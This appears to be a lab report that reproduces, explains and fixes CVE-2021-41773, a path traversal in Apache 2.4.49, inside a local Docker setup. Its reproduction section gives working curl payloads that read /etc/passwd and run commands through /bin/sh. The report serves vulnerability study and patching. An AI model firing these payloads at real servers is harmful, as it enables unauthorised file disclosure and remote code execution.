# Work 1 — CVE reproduction, root cause and fix

Target: **CVE-2021-41773** — path traversal in Apache HTTP Server 2.4.49
(affects 2.4.49; 2.4.50 partially, fully fixed in 2.4.51; double-encoded variant is CVE-2021-42013).

## 1. Vulnerable environment

`docker-compose.yml` starts `httpd:2.4.49` with CGI enabled and `<Directory />` set to
`Require all granted` — the configuration used by the public Vulhub PoC
(`vulhub/httpd/CVE-2021-41773`).

```bash
docker compose up -d          # starts httpd 2.4.49 on http://127.0.0.1:8080
docker compose ps
curl -s http://127.0.0.1:8080/ | head -3
```

## 2. Reproduction

```bash
# traversal outside the document root (file disclosure)
curl --path-as-is -s "http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"

# same primitive reaching a shell when mod_cgi is enabled (RCE)
curl --path-as-is -s "http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
     --data "echo Content-Type: text/plain; echo; id"
```

Expected on the vulnerable build: the contents of `/etc/passwd` and the output of `id`
(`uid=1(daemon) gid=1(daemon)`), i.e. arbitrary file read and command execution as the
httpd user. Captured evidence goes to `evidence/`.

## 3. Root cause

Apache 2.4.49 rewrote path normalisation (`ap_normalize_path`). The new code only expanded
`%2e` segments for paths that *start* inside the document root and did not reject `..`
sequences that escape it, so `/.%2e/.%2e/...` normalised to `../../..` **after** the
authorisation check but **before** the file lookup. Two configuration choices turn this
into impact:

1. `<Directory />` is `Require all granted`, so the authorisation phase allows the escaped
   path;
2. `mod_cgi` is loaded, so any traversed executable is run with the request body as input.

Without (1) the request is a 403; without (2) it is file disclosure only. The bug class is
*improper input handling* (incomplete canonicalisation of user-controlled paths), not a
memory-safety defect.

## 4. Fix

Two independent layers (both applied in `fixed/`):

| Layer | Change | Why it works |
|---|---|---|
| Patch | `httpd:2.4.49` → `httpd:2.4.51` | 2.4.51 rejects any normalised path that escapes the document root, and also blocks the double-encoded `%252e` bypass of 2.4.50 |
| Hardening | `<Directory />` → `Require all denied`, CGI only inside `/usr/local/apache2/cgi-bin` | removes the second precondition: even with a future canonicalisation bug, traversal cannot be authorised |

```bash
cd fixed
docker compose up -d --build
```

## 5. Verification and regression

```bash
# attack must fail now (403 or 400, never /etc/passwd content)
cd fixed && bash ../poc.sh http://127.0.0.1:8081

# normal functionality must still work
curl -s http://127.0.0.1:8081/ | head -3
curl -s "http://127.0.0.1:8081/cgi-bin/hello.sh"     # legitimate CGI still executes
```

`poc.sh` exits non-zero when any attack payload returns file content, so it doubles as a
regression check in CI or by hand.

## 6. Evidence checklist

- [ ] `docker compose up -d` output and container list
- [ ] traversal request + `/etc/passwd` response (screenshot)
- [ ] `id` output through `/bin/sh` (screenshot)
- [ ] `poc.sh` against the fixed container (all blocked)
- [ ] home page still served after the fix (regression)
